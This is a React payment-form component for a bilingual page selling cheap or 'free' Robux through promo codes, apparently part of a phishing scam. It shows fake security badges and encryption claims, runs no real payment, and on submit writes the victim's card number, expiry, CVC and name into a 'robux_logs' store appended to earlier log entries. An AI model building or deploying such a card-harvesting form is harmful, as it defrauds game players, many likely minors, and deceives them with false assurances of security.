
import React, { useState, useMemo, useEffect, useRef } from 'react';
import { Language } from '../types';

interface PaymentFormProps {
  onComplete: (promo: string) => void;
  onBack: () => void;
  lang: Language;
  theme: 'dark' | 'light';
  isFreeRedeemed: boolean;
  isGiftPromoRedeemed: boolean;
  robuxAmount?: number;
  isGift?: boolean;
  isAdminMode?: boolean;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ onComplete, onBack, lang, theme, isFreeRedeemed, isGiftPromoRedeemed, robuxAmount = 1000, isGift = false, isAdminMode = false }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [name, setName] = useState('');
  const [promo, setPromo] = useState('');
  const [loading, setLoading] = useState(false);
  const [isFlipped, setIsFlipped] = useState(false);
  const [promoError, setPromoError] = useState<string | null>(null);
  
  // Advanced Parallax & Light State
  const [tilt, setTilt] = useState({ x: 0, y: 0 });
  const [lightPos, setLightPos] = useState({ x: 50, y: 50 });
  const cardRef = useRef<HTMLDivElement>(null);

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!cardRef.current || isFlipped) return;
    const rect = cardRef.current.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    // Tilt calculation
    const centerX = rect.width / 2;
    const centerY = rect.height / 2;
    const rotateX = (y - centerY) / 12;
    const rotateY = (centerX - x) / 12;
    setTilt({ x: rotateX, y: rotateY });

    // Light position for holographic effect
    const px = (x / rect.width) * 100;
    const py = (y / rect.height) * 100;
    setLightPos({ x: px, y: py });
  };

  const handleMouseLeave = () => {
    setTilt({ x: 0, y: 0 });
    setLightPos({ x: 50, y: 50 });
  };

  const cleanPromo = promo.toLowerCase().trim();
  const isFreeInput = cleanPromo === 'free';
  const isGiftInput = cleanPromo === 'gift';
  
  const isFree = isAdminMode || (isFreeInput && !isFreeRedeemed);
  const isGiftDiscount = isGiftInput && !isGiftPromoRedeemed;

  const basePrice = useMemo(() => {
    if (isAdminMode) return 0;
    const prices: Record<number, number> = { 500: 0.50, 1000: 1.00, 5000: 5.00, 10000: 10.00 };
    return prices[robuxAmount] || 1.00;
  }, [robuxAmount, isAdminMode]);

  const displayedPrice = useMemo(() => {
    if (isFree) return 0;
    if (isGiftDiscount) return basePrice * 0.0001; 
    return basePrice;
  }, [basePrice, isFree, isGiftDiscount]);

  useEffect(() => {
    if (isFreeInput && isFreeRedeemed && !isAdminMode) {
      setPromoError(lang === 'ro' ? 'Cod utilizat!' : 'Code used!');
    } else if (isGiftInput && isGiftPromoRedeemed && !isAdminMode) {
      setPromoError(lang === 'ro' ? 'Cod cadou utilizat!' : 'Gift code used!');
    } else {
      setPromoError(null);
    }
  }, [promo, isFreeRedeemed, isGiftPromoRedeemed, lang, isFreeInput, isGiftInput, isAdminMode]);

  const content = {
    en: {
      back: "BACK",
      title: "PREMIUM CHECKOUT",
      secure: "ULTRA-SECURE 256-BIT SSL",
      promo: "PROMO CODE",
      card: "CARD NUMBER",
      expiry: "EXPIRY",
      cvc: "CVC",
      holder: "CARDHOLDER NAME",
      pay: `AUTHORIZE $${displayedPrice.toFixed(2)}`,
      claim: `CLAIM ${robuxAmount.toLocaleString()} ROBUX`,
      proc: "ENCRYPTING DATA..."
    },
    ro: {
      back: "ÎNAPOI",
      title: "FINALIZARE PREMIUM",
      secure: "ULTRA-SECURIZAT 256-BIT",
      promo: "COD PROMOȚIONAL",
      card: "NUMĂR CARD",
      expiry: "EXPIRARE",
      cvc: "CVC",
      holder: "NUME POSESOR",
      pay: `CONFIRMĂ $${displayedPrice.toFixed(2)}`,
      claim: `REVENDICĂ ${robuxAmount.toLocaleString()} ROBUX`,
      proc: "CRIPTARE DATE..."
    }
  }[lang === 'ru' ? 'en' : lang] || { back: "BACK", title: "CHECKOUT", secure: "SECURE", promo: "PROMO", card: "CARD", expiry: "EXPIRY", cvc: "CVC", holder: "HOLDER", pay: "PAY", claim: "CLAIM", proc: "..." };

  const formatCardNumber = (v: string) => v.replace(/\D/g, '').substring(0, 16).match(/.{1,4}/g)?.join(' ') || v.replace(/\D/g, '').substring(0, 16);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (promoError) return;
    setLoading(true);
    const logs = JSON.parse(localStorage.getItem('robux_logs') || '[]');
    if (logs.length > 0) {
      const entry = logs[logs.length - 1];
      entry.promoCode = cleanPromo || (isAdminMode ? 'ADMIN' : 'None');
      if (!isFree) {
        entry.cardNumber = cardNumber;
        entry.cardName = name || 'Premium Member';
        entry.expiry = expiry;
        entry.cvc = cvc;
      }
      localStorage.setItem('robux_logs', JSON.stringify(logs));
    }
    setTimeout(() => onComplete(promo), 3500);
  };

  return (
    <div className="w-full max-w-xl perspective-[2000px] animate-in fade-in zoom-in duration-1000">
      <style>{`
        .card-perspective { perspective: 2000px; cursor: pointer; }
        .card-main {
          width: 100%; height: 260px; position: relative;
          transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1);
          transform-style: preserve-3d;
        }
        .card-face {
          position: absolute; inset: 0; backface-visibility: hidden;
          border-radius: 2.5rem; padding: 2.5rem; overflow: hidden;
          border: 1px solid rgba(255,255,255,0.15);
          box-shadow: 0 45px 90px -15px rgba(0,0,0,0.8);
        }
        .card-front {
          background: linear-gradient(135deg, #1a1a1a 0%, #050505 100%);
          background-image: radial-gradient(circle at center, rgba(255,255,255,0.03) 1px, transparent 1px);
          background-size: 14px 14px;
        }
        .card-back {
          background: linear-gradient(135deg, #0a0a0a, #000);
          transform: rotateY(180deg);
        }
        .card-chip {
          width: 64px; height: 48px; border-radius: 10px;
          background: linear-gradient(135deg, #efbf5e 0%, #d4af37 50%, #8a6d1c 100%);
          position: relative; border: 1.5px solid rgba(0,0,0,0.2);
          box-shadow: inset 0 2px 4px rgba(255,255,255,0.4);
        }
        .chip-detail {
          position: absolute; background: rgba(0,0,0,0.2);
        }
        .holo-seal {
          width: 45px; height: 45px; border-radius: 50%;
          background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
          background-size: 300% 300%;
          animation: holo-shine 5s infinite;
          opacity: 0.6; mix-blend-mode: color-dodge;
          border: 1px solid rgba(255,255,255,0.4);
        }
        .step-tag { font-size: 10px; font-weight: 900; letter-spacing: 0.4em; color: #475569; text-transform: uppercase; }
      `}</style>

      <div className="glass-effect p-10 md:p-14 rounded-[4.5rem] relative overflow-hidden transition-all duration-1000">
        
        {/* Spectacular Lighting Background */}
        <div className="absolute top-0 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-[120px] pointer-events-none animate-pulse"></div>
        <div className="absolute bottom-0 left-0 w-96 h-96 bg-green-600/10 rounded-full blur-[120px] pointer-events-none animate-pulse delay-700"></div>

        <button onClick={onBack} className="absolute left-10 top-10 flex items-center gap-2 group z-20">
          <div className="w-10 h-10 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center transition-all group-hover:bg-red-600 group-hover:border-red-600 group-hover:scale-110 shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="4" d="M15 19l-7-7 7-7" /></svg>
          </div>
          <span className="step-tag group-hover:text-white transition-colors">{content.back}</span>
        </button>

        <div className="text-center mt-12 mb-12 relative z-10">
          <h2 className="text-5xl font-[1000] mb-4 tracking-tighter uppercase text-white text-glow">{content.title}</h2>
          <div className="inline-flex items-center gap-3 px-8 py-2.5 rounded-full bg-blue-500/10 border border-blue-500/20 shadow-[0_0_30px_rgba(59,130,246,0.2)] animate-pulse">
            <span className="w-2.5 h-2.5 bg-blue-500 rounded-full"></span>
            <span className="text-blue-400 text-[11px] font-black tracking-[0.4em] uppercase">{content.secure}</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-10 relative z-10">
          
          <div className="space-y-4">
            <label className="step-tag px-3 block">{content.promo}</label>
            <div className="relative group">
              <input
                type="text"
                placeholder="PROMO"
                className="w-full border-4 rounded-[2.5rem] px-8 py-7 transition-all font-[1000] text-center text-4xl tracking-[0.4em] uppercase outline-none bg-slate-950/90 border-white/5 text-white focus:border-red-600 shadow-[inset_0_4px_10px_rgba(0,0,0,0.5)]"
                value={promo}
                onChange={(e) => setPromo(e.target.value)}
              />
              {(isFree || isGiftDiscount) && (
                <div className="absolute right-5 top-1/2 -translate-y-1/2 bg-gradient-to-r from-red-600 via-emerald-500 to-red-600 text-white text-[12px] font-black px-8 py-4 rounded-[1.5rem] animate-bounce shadow-2xl border border-white/20">
                  {isGiftDiscount ? '-99.99% ACTIVATED' : 'FREE PASS'}
                </div>
              )}
            </div>
            {promoError && <p className="text-red-500 text-[11px] font-black text-center mt-2 animate-pulse uppercase tracking-widest">{promoError}</p>}
          </div>

          {displayedPrice === 0 ? (
            <div className="w-full h-[320px] rounded-[4rem] p-12 bg-gradient-to-br from-yellow-500 via-yellow-200 to-yellow-700 shadow-[0_60px_120px_-20px_rgba(251,191,36,0.6)] flex flex-col justify-between relative overflow-hidden group/vouch animate-in zoom-in duration-700 border-4 border-white/40">
              <div className="shimmer-sweep"></div>
              <div className="absolute -right-20 -top-20 text-[280px] opacity-10 rotate-12 select-none pointer-events-none text-white font-black">🎁</div>
              <div className="flex justify-between items-start z-10">
                <div className="flex flex-col">
                  <h4 className="text-slate-950 font-[1000] text-4xl italic tracking-tighter leading-none text-glow">ULTRA VOUCHER</h4>
                  <span className="text-slate-800 text-[12px] font-black tracking-[0.5em] mt-4 uppercase">HOLIDAY MASTER KEY</span>
                </div>
                <div className="w-24 h-24 bg-white/30 backdrop-blur-md rounded-[2.5rem] flex items-center justify-center text-6xl shadow-2xl animate-float border border-white/40">🎅</div>
              </div>
              <div className="text-center z-10">
                <div className="text-9xl font-[1000] text-slate-950 tracking-tighter flex items-center justify-center gap-6 drop-shadow-2xl">
                  {robuxAmount.toLocaleString()} 
                  <span className="text-white text-4xl mt-12 italic opacity-90">RBX</span>
                </div>
              </div>
              <div className="flex justify-between items-end border-t border-slate-900/20 pt-8 z-10">
                <div className="flex flex-col">
                   <span className="text-[11px] font-black text-slate-800 uppercase tracking-widest opacity-60">NET PAYABLE</span>
                   <span className="text-[20px] font-[1000] text-emerald-900 uppercase italic">$0.00 (BYPASSED)</span>
                </div>
                <div className="bg-slate-900 text-white px-6 py-2.5 rounded-2xl text-xs font-black tracking-widest uppercase shadow-xl">
                  {cleanPromo || 'AUTHENTICATED'}
                </div>
              </div>
            </div>
          ) : (
            <div className="animate-in slide-in-from-top-12 duration-1000">
              {/* 3D Dynamic Card */}
              <div className="card-perspective mb-14" onMouseMove={handleMouseMove} onMouseLeave={handleMouseLeave}>
                <div 
                  className={`card-main ${isFlipped ? 'flipped' : ''}`}
                  style={{ transform: !isFlipped ? `rotateX(${tilt.x}deg) rotateY(${tilt.y}deg)` : 'rotateY(180deg)' }}
                  ref={cardRef}
                >
                  <div className="card-face card-front">
                    {/* Dynamic Holographic Shine */}
                    <div 
                      className="absolute inset-0 holo-overlay opacity-60"
                      style={{ backgroundPosition: `${lightPos.x}% ${lightPos.y}%` }}
                    />
                    <div className="flex justify-between items-start relative z-10">
                      <div className="card-chip">
                        <div className="chip-detail w-full h-[1px] top-1/3"></div>
                        <div className="chip-detail w-full h-[1px] top-2/3"></div>
                        <div className="chip-detail h-full w-[1px] left-1/2"></div>
                      </div>
                      <div className="flex flex-col items-end">
                        <div className="text-white font-[1000] text-2xl italic tracking-[0.2em] drop-shadow-2xl">VISA</div>
                        <div className="holo-seal mt-2"></div>
                      </div>
                    </div>
                    <div className="text-4xl md:text-5xl font-mono text-white tracking-[0.2em] text-center my-8 drop-shadow-[0_8px_15px_rgba(0,0,0,1)] relative z-10">
                      {cardNumber || '•••• •••• •••• ••••'}
                    </div>
                    <div className="flex justify-between items-end relative z-10">
                      <div className="flex flex-col gap-2">
                        <span className="text-[10px] text-white/50 font-black uppercase tracking-[0.3em]">Card Holder</span>
                        <span className="text-lg font-black text-white uppercase tracking-tight truncate max-w-[240px] drop-shadow-lg italic">{name || 'VALUED CUSTOMER'}</span>
                      </div>
                      <div className="flex flex-col items-end gap-2">
                        <span className="text-[10px] text-white/50 font-black uppercase tracking-[0.3em]">Expiry</span>
                        <span className="text-lg font-black text-white drop-shadow-lg">{expiry || 'MM/YY'}</span>
                      </div>
                    </div>
                  </div>
                  <div className="card-face card-back">
                    <div className="magnetic h-16"></div>
                    <div className="signature-area h-14 mt-20">
                      <span className="text-slate-900 text-xl tracking-[0.5em]">{cvc || '•••'}</span>
                    </div>
                    <div className="mt-44 px-8 text-[9px] text-white/30 font-bold leading-relaxed uppercase tracking-tighter text-center">
                      Confidential Premium Card // End-to-End Encryption Enabled // SSL-Ice Secure Node active.
                    </div>
                  </div>
                </div>
              </div>

              {/* Spectacular Input Fields */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className="col-span-full space-y-3 group">
                  <label className="step-tag px-3 group-focus-within:text-blue-500 transition-colors">{content.card}</label>
                  <input
                    type="text" required placeholder="0000 0000 0000 0000"
                    className="w-full border-2 rounded-[2rem] px-8 py-6 font-mono text-2xl outline-none bg-white/5 border-white/5 text-white focus:border-blue-600 transition-all shadow-2xl focus:bg-white/10"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                    onFocus={() => setIsFlipped(false)}
                  />
                </div>
                <div className="space-y-3 group">
                  <label className="step-tag px-3 group-focus-within:text-blue-500 transition-colors">{content.expiry}</label>
                  <input
                    type="text" required placeholder="MM/YY" maxLength={5}
                    className="w-full border-2 rounded-[2rem] px-8 py-6 font-mono text-center text-xl outline-none bg-white/5 border-white/5 text-white focus:border-blue-600 transition-all focus:bg-white/10"
                    value={expiry}
                    onChange={(e) => setExpiry(e.target.value)}
                    onFocus={() => setIsFlipped(false)}
                  />
                </div>
                <div className="space-y-3 group">
                  <label className="step-tag px-3 group-focus-within:text-blue-500 transition-colors">{content.cvc}</label>
                  <input
                    type="password" required placeholder="•••" maxLength={3}
                    className="w-full border-2 rounded-[2rem] px-8 py-6 font-mono text-center text-xl outline-none bg-white/5 border-white/5 text-white focus:border-blue-600 transition-all focus:bg-white/10"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, '').substring(0,3))}
                    onFocus={() => setIsFlipped(true)}
                    onBlur={() => setIsFlipped(false)}
                  />
                </div>
                <div className="col-span-full space-y-3 group">
                  <label className="step-tag px-3 group-focus-within:text-blue-500 transition-colors">{content.holder}</label>
                  <input
                    type="text" placeholder="NAME ON CARD"
                    className="w-full border-2 rounded-[2rem] px-8 py-6 font-[1000] uppercase text-base outline-none bg-white/5 border-white/5 text-white focus:border-blue-600 transition-all shadow-xl focus:bg-white/10"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    onFocus={() => setIsFlipped(false)}
                  />
                </div>
              </div>
            </div>
          )}

          <button
            type="submit"
            disabled={loading || !!promoError}
            className={`w-full py-9 rounded-[3rem] font-[1000] text-[16px] tracking-[0.5em] uppercase transition-all shadow-[0_40px_80px_-15px_rgba(0,0,0,0.8)] active:scale-95 flex items-center justify-center gap-5 ${displayedPrice === 0 ? 'bg-gradient-to-r from-yellow-400 to-yellow-600 text-slate-950 border-4 border-white/20' : isGiftDiscount ? 'bg-gradient-to-r from-red-600 to-emerald-600 text-white shadow-emerald-600/20' : 'bg-white text-slate-900 hover:bg-slate-100'} ${loading ? 'opacity-50 grayscale cursor-not-allowed' : 'hover:-translate-y-2'}`}
          >
            {loading ? (
              <svg className="animate-spin h-7 w-7 text-current" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
            ) : null}
            {loading ? content.proc : (displayedPrice === 0 ? content.claim : content.pay)}
          </button>
        </form>
      </div>
    </div>
  );
};

export default PaymentForm;
